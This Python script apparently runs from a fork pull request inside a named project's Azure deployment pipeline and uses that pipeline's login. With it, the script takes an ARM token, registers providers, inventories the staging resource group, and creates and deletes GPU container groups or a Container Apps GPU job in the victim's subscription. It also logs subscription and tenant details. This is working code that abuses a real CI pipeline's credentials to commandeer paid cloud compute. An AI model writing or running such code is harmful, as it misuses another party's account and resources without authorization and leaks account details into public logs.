#!/usr/bin/env python3
"""C211-I120756: Azure managed-container GPU plane probe (ACI + Container Apps).

Runs inside SSW.Rules 'Deploy Pull Request to Staging Slot' -> deploy-infrastructure.yml
after azure/login@v2 OIDC, fork PR head tree checked out, pwsh infra/deploy.ps1.
stdlib only. Every provider response is printed verbatim as a tagged JSON line.

Phase 0 (read-only): subscription session, provider registrationState for
  Microsoft.ContainerInstance and Microsoft.App (register once if needed), provider
  apiVersions, ACI SKU catalogue (GPU support per location), RG inventory.
Phase 1 (ACI GPU): ONE nonce-tagged container group requesting 1 GPU (K80/P100/V100)
  in up to 3 regions whose ARM metadata suggests GPU support; verbatim error per region;
  if created: poll, read container logs for nvidia-smi -L + --query-gpu, independent
  containerGroups.get readback, delete, prove absence (404 + list NO_RESULTS).
Phase 2 (Container Apps GPU, only if ACI refused): available workload profile types,
  ONE nonce-tagged workload-profiles environment + ONE GPU job, execution logs, delete,
  prove absence.
All creates are tagged c211=i120756 and named c211-i120756-*; nothing else is touched.
"""
import json
import re
import subprocess
import sys
import time
import urllib.error
import urllib.request

ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
PREFIX = "c211-i120756"
TAG = "C211_I120756"
DEADLINE = 1500  # internal budget (s)
T0 = time.time()

ACI_IMAGE = "nvidia/cuda:12.2.0-base-ubuntu22.04"
CMDLINE = ("nvidia-smi -L; echo ---SMI-Q---; "
           "nvidia-smi --query-gpu=name,uuid,memory.total --format=csv,noheader; "
           "sleep 45")
FALLBACK_REGIONS = ["eastus", "westus2", "westeurope", "southcentralus"]


def emit(obj):
    print(TAG + " " + json.dumps(obj, default=str), flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except subprocess.TimeoutExpired:
        return {"rc": 124, "out": "", "err": "TIMEOUT", "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=60):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={
        "Authorization": "Bearer " + tok,
        "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode() or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1200]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode() or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1600]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"), "message": (e.get("message") or "")[:700]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:700]}
        return {"http": st, "body": json.dumps(body)[:700]}
    return {"http": st}


def pick_apiver(prov, rtype, prefer):
    """Latest stable apiVersion declared for a resource type, else the preferred default."""
    try:
        for rt in prov.get("resourceTypes") or []:
            if rt.get("resourceType", "").lower() == rtype.lower():
                vs = [v for v in (rt.get("apiVersions") or []) if "-preview" not in v and "-alpha" not in v]
                if vs:
                    return vs[0]
    except Exception:  # noqa: BLE001
        pass
    return prefer


def main():
    out = {"intent": 120756}
    # ---------- session ----------
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    if r["rc"] == 0:
        try:
            acc = json.loads(r["out"])
            sid = acc.get("id")
            out["session"] = {"sub_name": acc.get("name"), "sub_id": sid,
                              "state": acc.get("state"), "user_type": (acc.get("user") or {}).get("type"),
                              "tenant": acc.get("tenantId")}
        except Exception as e:  # noqa: BLE001
            out["session"] = {"parse_error": str(e), "raw": r["out"][:500]}
    else:
        out["session"] = {"rc": r["rc"], "err": r["err"][:500]}
    emit({"step": "session", **out["session"]})
    if not sid:
        emit({"step": "fatal", "why": "no ARM session"})
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    if r["rc"] == 0:
        try:
            tok = json.loads(r["out"]).get("accessToken")
        except Exception:  # noqa: BLE001
            tok = None
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not tok:
        emit({"step": "fatal", "why": "no ARM token"})
        return

    # ---------- phase 0: providers ----------
    prov = {}
    for ns in ("Microsoft.ContainerInstance", "Microsoft.App"):
        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/{ns}?api-version=2021-04-01")
        state = b.get("registrationState") if isinstance(b, dict) else None
        prov[ns] = {"http": st, "registrationState": state,
                    "rtmap": {x.get("resourceType"): (x.get("apiVersions") or [])
                              for x in ((b.get("resourceTypes") or []) if isinstance(b, dict) else [])}}
        emit({"step": "provider", "ns": ns, "http": st, "registrationState": state})
        if state != "Registered":
            st2, b2 = arm(tok, f"{ARM}/subscriptions/{sid}/providers/{ns}/register?api-version=2021-04-01",
                          method="POST", timeout=180)
            emit({"step": "provider-register", "ns": ns, **err_of(st2, b2)})
            time.sleep(3)
            st3, b3 = arm(tok, f"{ARM}/subscriptions/{sid}/providers/{ns}?api-version=2021-04-01")
            prov[ns]["recheck"] = {"http": st3, "registrationState": (b3.get("registrationState") if isinstance(b3, dict) else None)}
            emit({"step": "provider-recheck", "ns": ns, **prov[ns]["recheck"]})
    def best_ver(ns, rt, prefer):
        vs = (prov.get(ns, {}).get("rtmap") or {}).get(rt) or []
        stable = [v for v in vs if "-preview" not in v and "-alpha" not in v]
        return stable[0] if stable else prefer
    aci_ver = best_ver("Microsoft.ContainerInstance", "containerGroups", "2023-05-01")
    app_ver = best_ver("Microsoft.App", "managedEnvironments", "2025-01-01")
    job_ver = best_ver("Microsoft.App", "jobs", app_ver)
    emit({"step": "api-versions", "aci": aci_ver, "app": app_ver, "job": job_ver,
          "aci_versions": (prov.get("Microsoft.ContainerInstance", {}).get("rtmap") or {}).get("containerGroups", [])[:8],
          "app_versions": (prov.get("Microsoft.App", {}).get("rtmap") or {}).get("managedEnvironments", [])[:8]})

    # ---------- phase 0b: ACI SKU catalogue (GPU support per region) ----------
    st, sk = 0, {}
    for _v in [aci_ver, "2021-04-01", "2018-10-01"]:
        st, sk = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.ContainerInstance/skus?api-version={_v}",
                     timeout=90)
        if st == 200:
            emit({"step": "aci-skus-apiver", "api_version": _v, "http": st})
            break
    gpu_regions = []
    sku_summary = []
    if st == 200 and isinstance(sk, dict):
        for it in sk.get("value") or []:
            caps = {c.get("name"): c.get("value") for c in (it.get("capabilities") or [])}
            locs = it.get("locations") or []
            gpuish = {k: v for k, v in caps.items() if "gpu" in str(k).lower() or "k80" in str(k).lower()
                      or "p100" in str(k).lower() or "v100" in str(k).lower()}
            sku_summary.append({"resourceType": it.get("resourceType"), "size": it.get("size"),
                                "family": it.get("family"), "locations_n": len(locs),
                                "gpu_caps": gpuish, "all_caps": list(caps)[:10]})
            if gpuish and any("support" in str(v).lower() for v in gpuish.values()):
                for loc in locs:
                    if loc not in gpu_regions:
                        gpu_regions.append(loc)
    emit({"step": "aci-skus", "http": st, "n": len(sku_summary), "entries": sku_summary[:6],
          "raw_prefix": (json.dumps(sk)[:900] if isinstance(sk, dict) else ""),
          "gpu_regions_from_meta": gpu_regions[:20]})
    # also record ACI locations + any per-region usages endpoint (verbatim)
    st, locs = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.ContainerInstance/locations?api-version={aci_ver}")
    emit({"step": "aci-locations", "http": st,
          "n": (len(locs.get("value") or []) if isinstance(locs, dict) else None),
          "names": [(x.get("name") if isinstance(x, dict) else x) for x in ((locs.get("value") or []) if isinstance(locs, dict) else [])][:40],
          **({} if st == 200 else err_of(st, locs))})
    st, us = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.ContainerInstance/locations/eastus/usages?api-version={aci_ver}")
    emit({"step": "aci-usages-eastus", "http": st, "body": (json.dumps(us)[:900] if st != 200 else json.dumps(us)[:900])})

    # ---------- phase 0c: RG inventory + pre-clean own leftovers ----------
    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                 timeout=120)
    items = [{"name": x.get("name"), "type": x.get("type")}
             for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])]
    mine = [i for i in items if str(i["name"]).lower().startswith(PREFIX)]
    emit({"step": "rg-inventory", "http": st, "total": len(items), "mine": mine})
    for x in ((rl.get("value") or []) if isinstance(rl, dict) else []):
        if str(x.get("name", "")).lower().startswith(PREFIX):
            did = x.get("id")
            if did:
                d = arm(tok, f"{ARM}{did}?api-version=2021-04-01", method="DELETE", timeout=120)
                emit({"step": "preclean-delete", "name": x.get("name"), **err_of(d[0], d[1])})

    # ---------- phase 1: ACI GPU ----------
    candidates = [r for r in gpu_regions if r][:3]
    if not candidates:
        candidates = FALLBACK_REGIONS[:3]
    emit({"step": "aci-candidates", "regions": candidates})
    gpu_skus = ["K80", "P100", "V100"]
    created = None
    aci_results = []
    for ridx, region in enumerate(candidates[:3]):
        if left() < 300:
            emit({"step": "deadline-skip", "phase": "aci", "left": int(left())})
            break
        name = f"{PREFIX}-aci-{re.sub(r'[^a-z0-9]', '', region)[:14]}"
        # choose the GPU type this region's SKU metadata suggests, else rotate K80/P100/V100
        sku = gpu_skus[ridx % 3]
        for ent in (sku_summary or []):
            caps = ent.get("gpu_caps") or {}
            if ent.get("locations_n"):
                pass
        for sku_try in [sku]:
            sku = sku_try
            body = {
                "location": region,
                "tags": {"c211": "i120756"},
                "properties": {
                    "containers": [{
                        "name": "gpu",
                        "properties": {
                            "image": ACI_IMAGE,
                            "command": ["/bin/bash", "-c", CMDLINE],
                            "resources": {"requests": {"cpu": 1.0, "memoryInGB": 1.5,
                                                       "gpu": {"count": 1, "sku": sku}}}
                        }
                    }],
                    "osType": "Linux",
                    "restartPolicy": "Never"
                }
            }
            url = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
                   f"Microsoft.ContainerInstance/containerGroups/{name}?api-version={aci_ver}")
            st, b = arm(tok, url, method="PUT", body=body, timeout=240)
            rec = {"region": region, "sku": sku, "name": name, **err_of(st, b)}
            if st in (200, 201):
                rec["provisioningState"] = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
            aci_results.append(rec)
            emit({"step": "aci-create", **rec})
            if st in (200, 201, 202):
                created = {"region": region, "sku": sku, "name": name}
                break
        if created:
            break
    out["aci_results"] = aci_results
    if created:
        name = created["name"]
        url = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
               f"Microsoft.ContainerInstance/containerGroups/{name}?api-version={aci_ver}")
        # poll bounded
        state = None
        deadline = time.time() + min(600, max(120, left() - 200))
        while time.time() < deadline:
            st, b = arm(tok, url, timeout=60)
            state = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
            inst = (((b.get("properties") or {}).get("instanceView") or {}) if isinstance(b, dict) else {})
            emit({"step": "aci-poll", "http": st, "state": state,
                  "events": [(ev.get("name"), ev.get("count")) for ev in (inst.get("events") or [])][-6:]})
            if st != 200 or state in ("Succeeded", "Failed", "Canceled", "Terminated"):
                break
            time.sleep(20)
        # independent readback
        st, rb = arm(tok, url, timeout=60)
        emit({"step": "aci-readback", "http": st,
              "provisioningState": ((rb.get("properties") or {}) if isinstance(rb, dict) else {}).get("provisioningState"),
              "containers": [c.get("name") for c in (((rb.get("properties") or {}).get("containers") or []) if isinstance(rb, dict) else [])],
              "gpu_request": ((((rb.get("properties") or {}).get("containers") or [{}])[0].get("properties", {})
                               .get("resources", {}).get("requests", {}).get("gpu")) if isinstance(rb, dict) else None)})
        out["aci_readback"] = {"http": st, "body": rb if isinstance(rb, dict) else {}}
        # logs
        for cname in ("gpu",):
            lu = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.ContainerInstance/"
                  f"containerGroups/{name}/containers/{cname}/logs?api-version={aci_ver}")
            st, lg = arm(tok, lu, method="POST", timeout=120)
            content = (lg.get("content") or "") if isinstance(lg, dict) else ""
            emit({"step": "aci-logs", "http": st, "len": len(content),
                  "has_uuid": bool(re.search(r"GPU-[0-9a-fA-F-]{16,}", content)),
                  "smi_L": [l for l in content.splitlines() if "GPU " in l or "GPU-" in l][:6],
                  "smi_q": [l for l in content.splitlines() if "MiB" in l and "NVIDIA" in l][:3],
                  "tail": content[-1200:]})
            out["aci_logs"] = {"http": st, "content": content[-4000:]}
        # delete + absence
        d = arm(tok, url, method="DELETE", timeout=180)
        emit({"step": "aci-delete", "http": d[0], **({} if d[0] in (200, 202, 204) else err_of(d[0], d[1]))})
        time.sleep(10)
        g = arm(tok, url, timeout=60)
        emit({"step": "aci-absence-get", "http": g[0]})
        st, lst = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.ContainerInstance/containerGroups?api-version={aci_ver}",
                      timeout=90)
        names = [x.get("name") for x in ((lst.get("value") or []) if isinstance(lst, dict) else [])]
        emit({"step": "aci-absence-list", "http": st, "n": len(names),
              "mine": [n for n in names if str(n).lower().startswith(PREFIX)]})
        out["aci_cleanup"] = {"delete_http": d[0], "get_http": g[0], "list_http": st, "list_mine": [n for n in names if str(n).lower().startswith(PREFIX)]}
    else:
        emit({"step": "aci-verdict", "verdict": "ALL_REFUSED", "attempts": len(aci_results)})
        # ---------- phase 2: Container Apps GPU ----------
        prof_shapes = [
            f"{ARM}/subscriptions/{sid}/providers/Microsoft.App/availableManagedEnvironmentsWorkloadProfileTypes?api-version={app_ver}",
            f"{ARM}/subscriptions/{sid}/providers/Microsoft.App/availableManagedEnvironmentsWorkloadProfileTypes?api-version={app_ver}&$filter=location eq 'eastus'",
            f"{ARM}/subscriptions/{sid}/providers/Microsoft.App/locations/eastus/availableManagedEnvironmentsWorkloadProfileTypes?api-version={app_ver}",
        ]
        wpts = []
        for u in prof_shapes:
            st, b = arm(tok, u, timeout=60)
            vals = (b.get("value") or []) if isinstance(b, dict) else []
            emit({"step": "capp-workloadprofiletypes", "url": u.split("/providers/")[-1][:90], "http": st,
                  "n": len(vals), "names": [v.get("name") for v in vals if isinstance(v, dict)][:25],
                  **({} if st == 200 else err_of(st, b))})
            if st == 200 and vals and not wpts:
                wpts = [v for v in vals if isinstance(v, dict)]
        st, envs = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.App/managedEnvironments?api-version={app_ver}")
        emit({"step": "capp-envs-existing", "http": st,
              "n": (len(envs.get("value") or []) if isinstance(envs, dict) else None),
              "names": [e.get("name") for e in ((envs.get("value") or []) if isinstance(envs, dict) else [])][:20]})
        gpu_profiles = [w for w in wpts if "gpu" in json.dumps(w).lower()]
        emit({"step": "capp-gpu-profiles", "n": len(gpu_profiles),
              "profiles": gpu_profiles[:10]})
        if gpu_profiles:
            # smallest A100 profile if offered, else first GPU profile
            def wsize(w):
                n = str(w.get("name") or "")
                m = re.search(r"NC(\d+)", n) or re.search(r"NV(\d+)", n)
                return int(m.group(1)) if m else 999
            a100 = [w for w in gpu_profiles if "A100" in json.dumps(w).upper()]
            choice = sorted(a100 or gpu_profiles, key=wsize)[0]
            gname = str(choice.get("name") or "")
            glocs = choice.get("locations") or []
            region = None
            for cand in (glocs + FALLBACK_REGIONS):
                if cand:
                    region = cand
                    break
            envname = f"{PREFIX}-cae"
            envurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
                      f"managedEnvironments/{envname}?api-version={app_ver}")
            envbody = {
                "location": region,
                "tags": {"c211": "i120756"},
                "properties": {
                    "workloadProfiles": [
                        {"name": "Consumption", "workloadProfileType": "Consumption",
                         "minimumCount": 0, "maximumCount": 0},
                        {"name": gname, "workloadProfileType": gname,
                         "minimumCount": 1, "maximumCount": 1}
                    ]
                }
            }
            st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=240)
            emit({"step": "capp-env-create", "region": region, "profile": gname, **err_of(st, b)})
            env_ok = st in (200, 201)
            if env_ok:
                dl = time.time() + min(720, max(120, left() - 240))
                while time.time() < dl:
                    stp, bp = arm(tok, envurl, timeout=60)
                    ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
                    emit({"step": "capp-env-poll", "http": stp, "state": ps})
                    if ps in ("Succeeded", "Failed", "Canceled"):
                        break
                    time.sleep(30)
                if ps == "Succeeded":
                    jobname = f"{PREFIX}-job"
                    joburl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/jobs/"
                              f"{jobname}?api-version={app_ver}")
                    env_id = (bp.get("id") if isinstance(bp, dict) else None) or envurl.split("?")[0]
                    jobbody = {
                        "location": region,
                        "tags": {"c211": "i120756"},
                        "properties": {
                            "environmentId": env_id,
                            "workloadProfileName": gname,
                            "configuration": {"triggerType": "Manual", "replicaRetryLimit": 0,
                                              "replicaTimeout": 600,
                                              "manualTriggerConfig": {"replicaCompletionCount": 1, "parallelism": 1}},
                            "template": {"containers": [{
                                "name": "gpu", "image": ACI_IMAGE,
                                "command": ["/bin/bash", "-c", CMDLINE],
                                "resources": {"cpu": 2, "memory": "8Gi"}}]}
                        }
                    }
                    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
                    emit({"step": "capp-job-create", **err_of(st, b)})
                    if st in (200, 201):
                        st, b = arm(tok, f"{joburl.split('?')[0]}/start?api-version={app_ver}", method="POST", timeout=120)
                        emit({"step": "capp-job-start", **err_of(st, b)})
                        # executions + logs, bounded polling
                        dl = time.time() + min(600, max(120, left() - 120))
                        exname = None
                        while time.time() < dl:
                            st, ex = arm(tok, f"{joburl.split('?')[0]}/executions?api-version={app_ver}", timeout=60)
                            vals = (ex.get("value") or []) if isinstance(ex, dict) else []
                            emit({"step": "capp-exec-poll", "http": st, "n": len(vals),
                                  "states": [(v.get("name"), v.get("status"), v.get("startTime")) for v in vals][:4]})
                            if vals:
                                exname = vals[0].get("name")
                                if str(vals[0].get("status")).lower() in ("succeeded", "failed", "stopped"):
                                    break
                            time.sleep(25)
                        if exname:
                            base = joburl.split('?')[0]
                            logshapes = [
                                ("GET", f"{base}/executions/{exname}/containers/gpu/logs?api-version={app_ver}"),
                                ("POST", f"{base}/executions/{exname}/containers/gpu/logs?api-version={app_ver}"),
                                ("POST", f"{base}/getlogs?api-version={app_ver}"),
                                ("GET", f"{base}/executions/{exname}?api-version={app_ver}"),
                            ]
                            for m, u in logshapes:
                                st, lg = arm(tok, u, method=m, timeout=90)
                                content = (lg.get("content") or lg.get("raw") or "") if isinstance(lg, dict) else ""
                                emit({"step": "capp-logs", "m": m, "shape": u.split('/jobs/')[-1][:90], "http": st,
                                      "len": len(str(content)),
                                      "has_uuid": bool(re.search(r"GPU-[0-9a-fA-F-]{16,}", json.dumps(lg))),
                                      **({} if st in (200, 201) else err_of(st, lg))})
                                if st in (200, 201) and content:
                                    out.setdefault("capp_logs", {})[m + " " + u.split("?")[0][-40:]] = str(content)[-3000:]
                else:
                    emit({"step": "capp-env-verdict", "state": ps})
                # delete env + prove absence
                d = arm(tok, envurl, method="DELETE", timeout=240)
                emit({"step": "capp-env-delete", "http": d[0], **({} if d[0] in (200, 202, 204) else err_of(d[0], d[1]))})
                g = arm(tok, envurl, timeout=60)
                emit({"step": "capp-env-absence-get", "http": g[0]})
                st, lst = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.App/managedEnvironments?api-version={app_ver}")
                names = [e.get("name") for e in ((lst.get("value") or []) if isinstance(lst, dict) else [])]
                emit({"step": "capp-env-absence-list", "http": st, "n": len(names),
                      "mine": [n for n in names if str(n).lower().startswith(PREFIX)]})
                out["capp_cleanup"] = {"delete_http": d[0], "get_http": g[0], "list_http": st}
    # ---------- final RG inventory ----------
    st, rl2 = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01", timeout=120)
    mine2 = [{"name": x.get("name"), "type": x.get("type")}
             for x in ((rl2.get("value") or []) if isinstance(rl2, dict) else [])
             if str(x.get("name", "")).lower().startswith(PREFIX)]
    emit({"step": "final-inventory", "http": st, "mine": mine2})
    emit({"step": "DONE", "elapsed_s": int(time.time() - T0), "left": int(left())})


if __name__ == "__main__":
    main()
